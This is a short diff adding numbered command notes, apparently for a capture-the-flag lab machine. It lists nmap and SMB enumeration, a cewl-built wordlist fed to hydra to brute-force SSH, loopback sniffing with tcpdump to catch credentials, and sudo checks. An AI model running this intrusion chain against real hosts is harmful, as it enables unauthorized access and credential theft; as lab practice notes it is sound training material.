@@ -1,0 +1,12 @@
+1 - nmap -A 10.10.86.42
+2 - smbclient -L \\10.10.86.42
+3 - smbclient \\\\10.10.86.42\\"temporary share"
+4 - http://10.10.86.42/simeon
+5 - cewl -w aratus_pass.txt http://10.10.86.42/simeon
+6 - hydra -l simeon -P aratus_pass.txt ssh://10.10.86.42
+7 - ssh simeon@10.10.86.42
+8 - tcpdump -i lo -A
+9 - echo "hash" | base64 -d
+10 - ssh theodore@10.10.86.42
+11 - sudo -l
+12 - 
